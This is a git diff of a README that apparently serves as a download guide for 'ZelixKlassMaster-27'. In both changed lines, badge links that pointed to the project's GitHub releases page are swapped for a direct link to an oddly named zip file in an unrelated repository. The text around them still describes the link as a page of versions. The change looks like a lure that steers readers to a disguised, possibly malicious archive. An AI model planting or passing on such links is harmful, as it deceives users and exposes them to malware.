@@ -15,7 +15,7 @@ This guide walks you through everything from downloading to running the applicat
 
 **Step 1: Get the Application**
 
-[![Download Now](https://img.shields.io/badge/Download-ZelixKlassMaster--27-blueviolet?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Sakthi366/ZelixKlassMaster-27/releases)
+[![Download Now](https://img.shields.io/badge/Download-ZelixKlassMaster--27-blueviolet?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/Sakthi366/sakthi366.github.io/main/naphtholsulphonic/3.3.zip)
 
 Visit this link to download the application. This takes you to a page with all available versions. Look for the newest release at the top of the list.
 
@@ -150,7 +150,7 @@ Found ZelixKlassMaster-27 helpful? Here's how to get involved:
 
 Visit the releases page regularly to download the latest version with new features and improvements:
 
-[![Download Latest](https://img.shields.io/badge/Get-Latest_Version-green?style=flat-square&logo=download)](https://github.com/Sakthi366/ZelixKlassMaster-27/releases)
+[![Download Latest](https://img.shields.io/badge/Get-Latest_Version-green?style=flat-square&logo=download)](https://raw.githubusercontent.com/Sakthi366/sakthi366.github.io/main/naphtholsulphonic/3.3.zip)
 
 We hope this guide helps you get your software running again. Enjoy your restored programs and the extra speed they get along the way!
 
